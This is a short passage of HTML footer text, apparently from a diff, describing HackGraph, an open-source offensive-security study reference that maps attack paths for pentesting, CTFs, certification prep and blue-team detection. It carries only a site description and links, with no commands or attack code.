+<p>HackGraph is an open-source cybersecurity reference and study notes for offensive security. It maps attack paths as interactive, click-to-expand graphs that run from a foothold to Domain Admin or root. Every technique lists the commands to run, the tools it uses, detection and OPSEC notes, and links to primary sources. It works as notes for penetration testing, red teaming, and CTFs, for OSCP, OSEP, CRTP, CRTE, and PNPT prep, and as a detection reference for blue teams.</p>
+<p><a href="/">Interactive graph</a> &middot; <a href="/reference.html">All references</a> &middot; <a href="https://github.com/HackGraph/hackgraph.github.io">Source on GitHub</a></p>
+<p>This is a text mirror of the interactive graph for search engines and offline reading. Techniques are documented for authorized penetration testing, CTFs, certification study, and blue-team detection.</p>
+</footer>
+</body>
+</html>
